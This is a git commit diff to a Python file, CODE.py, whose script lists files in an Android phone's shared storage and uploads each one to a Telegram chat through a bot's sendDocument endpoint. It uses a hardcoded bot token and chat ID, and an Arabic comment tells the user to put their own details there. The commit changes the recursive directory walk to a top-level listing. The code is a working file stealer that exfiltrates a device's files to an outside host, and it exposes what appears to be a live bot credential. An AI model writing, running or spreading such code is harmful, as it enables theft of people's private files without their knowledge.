637164191976877681b46916f0bcc0d6e03e04c5
WASEEM2009a <abo.fahd271983@gmail.com>
2026-03-28 19:54:10 +0300

    Update CODE.py

--- CODE.py
+++ CODE.py
@@ -1,20 +1,23 @@
 import os
 import requests
 
+# 🔐 حط بياناتك هون
 BOT_TOKEN = "8694159518:AAF4O9s94rmrMcJ2xBbOf4Ov3-QErt64N8c"
 CHAT_ID = "7708603881"
 
-folder_path = "/storage/emulated/0/"
+folder = "/storage/emulated/0/"
+
+
 
 def send_file(file_path):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
     with open(file_path, "rb") as f:
         requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f})
 
-for root, dirs, files in os.walk(folder_path):
-    for file in files:
-        full_path = os.path.join(root, file)
+for file in os.listdir(folder):
+    path = os.path.join(folder, file)
+    if os.path.isfile(path):
         try:
-            send_file(full_path)
+            send_file(path)
         except Exception as e:
-            print(f"Error: {e}")
+            print("خطأ:", e)
